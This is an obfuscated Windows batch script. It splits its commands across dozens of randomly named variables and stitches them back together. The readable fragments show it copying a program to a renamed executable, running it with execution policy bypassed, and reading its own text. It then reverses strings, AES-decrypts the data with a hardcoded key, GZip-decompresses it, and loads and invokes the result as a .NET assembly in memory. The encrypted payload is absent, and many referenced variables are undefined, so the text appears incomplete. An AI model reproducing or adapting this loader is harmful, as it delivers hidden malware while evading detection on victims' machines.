@echo off
set "oArBNCzzwo=  $c"
set "eVkLCfPuEB=);$b"
set "TxMuuLVEwO=V = "
set "bOigaIYdLM=R, 0"
set "gUxvSijjOj=);$I"
set "PyunCLaEWJ= = ["
set "UsccQtUVdH=g = "
set "GJKTcWfSIh=Ti8L"
set "WTnxnOJKqb=lBlo"
set "WByQfwbxBh=]::C"
set "kTHKakBdag=Bmor"
set "EvdKsgELCi=.Cry"
set "VVkXFXvRDX=rans"
set "uOUGBeGKQV=($tn"
set "tgXNKWdBMR=gN+y"
set "jQxwCCZVmA=.Key"
set "WhDYCwYNZn= = N"
set "vYouqafDaH=..-1"
set "jYrDorslEr=[Env"
set "PKxbsmHyWQ=yTo("
set "RVYPDAJYnY=ypto"
set "iWwdkBhrHN=ect "
set "natjBTgsdl= [Sy"
set "XXxAnATTVf=ZN ="
set "rEXQYgmKKJ=;$Iq"
set "AfdQqxkqmg=am;$"
set "jZUcpXsQVv== [S"
set "LhPOZYMmdp=16] "
set "vCDdDCvPzH=ion."
set "MatPPrvctm=-joi"
set "wAuYeoHmGv=m(, "
set "FmhROILIhm=QuhC"
set "mcRPRGoCdC=..-1"
set "iyuslixekH=).Sp"
set "YzsHjettXj='gni"
set "GJVybxiwZk='txe"
set "GPGlGRgjjU=::De"
set "OmnzcJbSuv=ne);"
set "VlDWZlgBtU=nage"
set "JBHFALdmPP=GsA "
set "cBSdqVwETz=.Sec"
set "XVokxgMMff=wxGs"
set "ZRKlpUzARF=znSk"
set "AAISikMXFi=ecry"
set "dcmrxBOxmD=n ''"
set "iZRQAjVpeR=iOdg"
set "wjuidodtyE=S46e"
set "VQKsiEiugj=, (,"
set "FSmslEjQUz=urit"
set "xCgaTkSCJQ=b6t6"
set "kiuHZNgyaf=1] -"
set "bjBMnLxlcw=ay()"
set "QKQuwcgheK=]::("
set "yUgJAKmnPw=Secu"
set "oRQsFeajoB=in $"
set "xfHVTOJDRM=sion"
set "dwvokmRbGI=($tn"
set "OdUiKmlBcq=oArr"
set "DyBOJKsmDi=6esa"
set "oZrJKyrXxG=Disp"
set "SNvCJPJJJS=Invo"
set "aypHCpWvyr='[-1"
set "lvAmKEHHki=-4] "
set "OWdfePbEJn=[Sys"
set "akmVMvsIgE=A.En"
set "ufNakJwzqI=bypa"
set "JCJSzbPPHW=;$wx"
set "inwHutslRp=mID "
set "WttfUPUPqE=pose"
set "WeRdqwYfzQ=ddu."
set "aJpQQLSTEq=-ep "
set "qoCgbfoPGs=ct S"
set "nxwkjtlZPq=157K"
set "ZzlUiQGtDZ=y.Cr"
set "wqjBZtsduS=ert]"
set "PmASbjydcL=ewLi"
set "uhJCiwqCts=trea"
set "lPnNejDcnJ=Cf, "
set "VtTQeUPWvI=;$Ly"
set "hburvemVgL=stem"
set "QdojqotAQi=.IO."
set "rONrAINJJh=tem."
set "wvUgHABVlB=m.Re"
set "XGsvkyIgDA=n ''"
set "nXWXXpBkzP=lit("
set "DRzOcpiDlR=.Dis"
set "tKcJhuFOqj=R = "
set "GNpoJlDSib=xQhR"
set "fqZxLrAOmv=mMK4"
set "fjlCXgLWXF=tS46"
set "kVjgDWckgF=OCZN"
set "fkfWyltbJI=yste"
set "DDvuUJYIhe=ress"
set "FTmOhnuzxX=oL'["
set "FmKjHHcuGF=, $F"
set "PDsOzkiQmB=[Sys"
set "VsySOJktGg=orF'"
set "bUMtnAoVli=]::("
set "ANtJAoObfR=grap"
set "OVrDfXeEIn=New-"
set "emMGUDnznC=.Com"
set "gTCihCvhsi=ZN.T"
set "wyHfeWxYzR=hC.I"
set "nUoPHcVHui=$FxQ"
set "CsfjyAvhMc=);$p"
set "mXfBvGvozv=)($c"
set "CDqhURRidB=)) {"
set "ctcjnbbiwX=PKCS"
set "iFVjsRvzgN=FxQh"
set "IRJoVGfQPp=yste"
set "hbPjsGqfBD=TllA"
set "KTIVYdaYAa=$abK"
set "OyNzZOIlqm=Stre"
set "BbSgaRnbzP=.Cry"
set "VvbHLDqYUA=hy.A"
set "jVOvaKxMBS=wA.T"
set "GswEZMdQKu=ose("
set "RPaaYGSQXQ=;$ab"
set "wmxUXJyhXJ=[]] "
set "rTjSFkgQdU=]::N"
set "iSCxxWrVWP=daeR"
set "iPEhLhzkbA=stem"
set "caCfaDAdKK=$DuQ"
set "JyPXUFaNXK=ddin"
set "BTjiiYuULF=/a3B"
set "wUyXZxeAxG=tem."
set "DiqCvKjpac=();$"
set "YMlBhzXEYz=1..-"
set "HWqGmIhTje=Conv"
set "RbKYedRfBG=bjec"
set "JsynxbituG=morF"
set "gBLGQCyOCE=ddin"
set "iNmhKCXBaw= if "
set "rUXZNJJOvH=m.IO"
set "uEoHFqtxmO=null"
set "MzXzjSRWrp=ment"
set "TTLPPNcwLh=ress"
set "AiMAmAdSRw=SoYj"
set "SLpQSyKthE=hR ="
set "jkzeiIrhQC=TuCw"
set "OanqSIPBhp=tsWi"
set "EdacJikTMA=rt]:"
set "IEhkEzXWEv=vCf."
set "JUWcSBVCDM=y.Ci"
set "rXAuJbUOld=ptog"
set "MDGPejFgjG=$FOC"
set "CWBEvlUPvQ=Obje"
set "VBXjLHoZqC=tryP"
%MZIsuavsNa%%USKCYRVQtC%%oUcFgDvsVR%%vurisFfjFN%%TuiqGENduI%%NzKBgSXcmR%%EdxVFzABks%%MLlFITLLYB%%QsXmeWKPbz%%IcWOiQXnKh%%dlScWbneTm%%hldLamfkRJ%%PLAKJJPxwR%%VxbRxFzVqd%%IFWPsxYlNW%%KNwbrsKism%%lQHbrJkmnv%%MkTNbkOLrm%%LEJAhibZAf%%UrCdRSXVyJ%%mMXskzTIZh%%DZQfBHghTi%%IkLiAvIQWi%%mTnIaYHrpH%%osZsBUAxBk%%MPbpbcaORO%%RdMRUJMifD%%ZOSmUpktHG%%UkoLwxSXGX%%XSzAPlGiyR%%hsrYkXXOvM%%RHhlUGOaux%%RPBhFgorxI%"%~dp0%~nx0.exe"
cls
%MPRrDuBnvX%%hSdmfljdJH%
"%~nx0.exe" %BSBHJeCbfc%%bwOJMazyTo%%UvRDZyATNi%%aJpQQLSTEq%%ufNakJwzqI%%iwilgfaYHk%%EInWcrhYTb%%iGUCUPIQsq%%caCfaDAdKK%%KTmtMLRQXS%%BxFpzBCFrq%%xjFqiDfiVz%%QdojqotAQi%%YRTAPEunFy%%bUMtnAoVli%%GJVybxiwZk%%hbPjsGqfBD%%iSCxxWrVWP%%aypHCpWvyr%%vYouqafDaH%%kiuHZNgyaf%%gnAjkJMhGd%%JVHjikEhgx%%QOUoFSeIIO%%iyuslixekH%%nXWXXpBkzP%%jYrDorslEr%%FezSUlAoXZ%%MzXzjSRWrp%%rTjSFkgQdU%%PmASbjydcL%%OmnzcJbSuv%%zwToaLVGnK%%fKldkAZexZ%%uOUGBeGKQV%%inwHutslRp%%oRQsFeajoB%%KWvubLBnNW%%fkQrBSoDJR%%iNmhKCXBaw%%dwvokmRbGI%%ReyVkdbyQN%%QxAwtXKoKy%%OanqSIPBhp%%anXaaeoqWG%%ByKmGGWYVn%%CDqhURRidB%%oArBNCzzwo%%ItrdXppaJl%%MQFTNwWQfj%%ngnvsahjye%%hwBGFjmnkF%%BQySOxVxOr%%GJunbBgVKW%%hfBFdpoYnE%%kIFAHwIuGU%%eJvhxycnFe%%cqCnxvoSPy%%iXkkgXdTGF%%SLpQSyKthE%%natjBTgsdl%%iPEhLhzkbA%%vjHZlrbMvZ%%KULkliEaIn%%QKQuwcgheK%%YzsHjettXj%%SuXeAoeuWD%%DyBOJKsmDi%%kTHKakBdag%%OldzuwNMUi%%YMlBhzXEYz%%LhPOZYMmdp%%MatPPrvctm%%XGsvkyIgDA%%mXfBvGvozv%%JAIEvXswLP%%eVkLCfPuEB%%qGJDdPVRui%%WhDYCwYNZn%%fluNwrMuZq%%RbKYedRfBG%%cBcDTWsmif%%hburvemVgL%%cBSdqVwETz%%FSmslEjQUz%%ZzlUiQGtDZ%%RVYPDAJYnY%%ANtJAoObfR%%VvbHLDqYUA%%odbTIJUwPK%%VlDWZlgBtU%%bEnLevTrea%%kLdMJxMAbQ%%usmvWJSfIz%%xOEazJPpOm%%PDsOzkiQmB%%zFADAJsSPu%%DOIEDwgcna%%HwLOaQZxVM%%BbSgaRnbzP%%rXAuJbUOld%%dfDmUcUMCJ%%JUWcSBVCDM%%ifDxIKVrfZ%%WkmSIwyGmX%%WByQfwbxBh%%frkzUYBfDj%%gDHDNyIeuv%%dpqGPHGNrm%%JyPXUFaNXK%%UsccQtUVdH%%OWdfePbEJn%%rONrAINJJh%%yUgJAKmnPw%%NKKKyMuKSe%%EvdKsgELCi%%FkmViTQtEt%%CNPnzGedSN%%ndREDcQwru%%gBLGQCyOCE%%WbfzBQGQkL%%bBSOVCtIrf%%ctcjnbbiwX%%ipBoRlXscM%%valFtFIXLo%%jQxwCCZVmA%%PyunCLaEWJ%%EbFEJchxQI%%sewhNsSeLp%%mbfCXXFYcI%%EdacJikTMA%%uCfDhLbmAk%%TVTHwCVdGM%%wjuidodtyE%%hYslUKWBum%%VsySOJktGg%%nhmZdlhXAT%%IHOVcUCHNL%%GtIuQeLCtt%%dKNrqaLshI%%DYbBDnDCPT%%gDGUzUyRjZ%%AFDhPYUxFc%%jkzeiIrhQC%%AiMAmAdSRw%%BTjiiYuULF%%tgXNKWdBMR%%CqbGyrSdUo%%UbFjAparVk%%nxwkjtlZPq%%xCgaTkSCJQ%%fqZxLrAOmv%%VLGBDfUQxf%%gTnEQsVFpp%%wyHfeWxYzR%%TxMuuLVEwO%%qcfEKmdvHt%%wUyXZxeAxG%%HWqGmIhTje%%wqjBZtsduS%%TcrfuYZPvW%%HvhPhtLzsb%%fjlCXgLWXF%%fbgEMFElln%%JsynxbituG%%HTKtMKQPhn%%mcRPRGoCdC%%OAnerNKYeW%%XsCrYmqMSc%%OPdXbHAJvQ%%MFqSRhFGcZ%%ZRKlpUzARF%%qCKaNZwpcJ%%nbDokscKzQ%%GJKTcWfSIh%%iZRQAjVpeR%%KpDsLXowaX%%RPaaYGSQXQ%%TEHVBokNNa%%wMFIfqfrhf%%IJRKpsYQRT%%reroXgIIRx%%NBIZBfksUH%%AAISikMXFi%%ptVTJrvqKZ%%IxAKrhaRik%%iFVjsRvzgN%%tKcJhuFOqj%%KTIVYdaYAa%%jVOvaKxMBS%%VVkXFXvRDX%%BmBZAoXakp%%QxYfDyWHJx%%WTnxnOJKqb%%IjvDyXtPUL%%NxBlbyXfug%%bOigaIYdLM%%FmKjHHcuGF%%fgMXJzsbvP%%QDqjZTbpCQ%%ZpeifANrEu%%wDyObUbkwA%%qWHVWbVAkN%%GNRQGPcERj%%MaxbtnfChe%%SQSbzcIile%%FmhROILIhm%%RxsmOpzGCJ%%WttfUPUPqE%%hUsNEATFnK%%BwuUnvyGnj%%CbFChlScWY%%OVrDfXeEIn%%wTsRhzYySz%%qoCgbfoPGs%%IRJoVGfQPp%%rUXZNJJOvH%%ntjxIAtkCZ%%IoYpFFkeVA%%uhJCiwqCts%%wAuYeoHmGv%%nUoPHcVHui%%yFSUnfKHol%%jQQkDiTZkr%%XXxAnATTVf%%AIilTQIzLZ%%DZXvlwdely%%iWwdkBhrHN%%mRMjKBIFqM%%zuolNXacoQ%%wOHwWElfbs%%JqSYMMnOKK%%OyNzZOIlqm%%AfdQqxkqmg%%pDDYdjBpya%%KmrDcYbiwi%%VaPOREmcHp%%CWBEvlUPvQ%%nsMpBoNAOs%%wbTekpOOhz%%WzIjyOKNiQ%%emMGUDnznC%%QMopTAcwug%%xfHVTOJDRM%%EasXojomjG%%boBFIjktpX%%LntbtYEQNg%%TJIAYQuqbJ%%lPnNejDcnJ%%DqoTaqHqDp%%FxzcNsFaHS%%PTsGLWaFXk%%vCDdDCvPzH%%jdMLeNpkZM%%DDvuUJYIhe%%qbstUdUwzk%%WQAZJMgGCY%%GPGlGRgjjU%%ENHvrhKtRa%%TTLPPNcwLh%%CsfjyAvhMc%%WKnEFjifIB%%bNOBeMeQvT%%PKxbsmHyWQ%%MDGPejFgjG%%EXOkgODEfL%%wELSnlnlmt%%BKiROxgYwV%%gXHPoRWnUD%%IcsluiRNCS%%VtTQeUPWvI%%IEhkEzXWEv%%oZrJKyrXxG%%GswEZMdQKu%%caSmVeViGV%%kVjgDWckgF%%DRzOcpiDlR%%vgmjtoheOG%%DiqCvKjpac%%KTKeRkAdkF%%VrXOzeJZNo%%PYvzcuBXtr%%gTCihCvhsi%%OdUiKmlBcq%%bjBMnLxlcw%%JCJSzbPPHW%%JBHFALdmPP%%jZUcpXsQVv%%fkfWyltbJI%%wvUgHABVlB%%HkvmnKIHDC%%JYTlRzwLgo%%rcDgtNeOuO%%vwEuOUOSJO%%DMygYxCJoi%%eQPXjFGpTz%%FTmOhnuzxX%%KDcrLFEwhV%%lvAmKEHHki%%nyZjjJzJZL%%dcmrxBOxmD%%bjiXojtaeC%%GNpoJlDSib%%gUxvSijjOj%%QkuGheqcVZ%%qyFxfpNYIl%%XVokxgMMff%%akmVMvsIgE%%VBXjLHoZqC%%vlAClUVkia%%rEXQYgmKKJ%%WeRdqwYfzQ%%SNvCJPJJJS%%zizfnrEgkE%%uEoHFqtxmO%%VQKsiEiugj%%wDaSjOFMPZ%%RSVUvoyOWs%%wmxUXJyhXJ%%ijZaiRDwyR%%LHHmXcVPWU%
exit /b
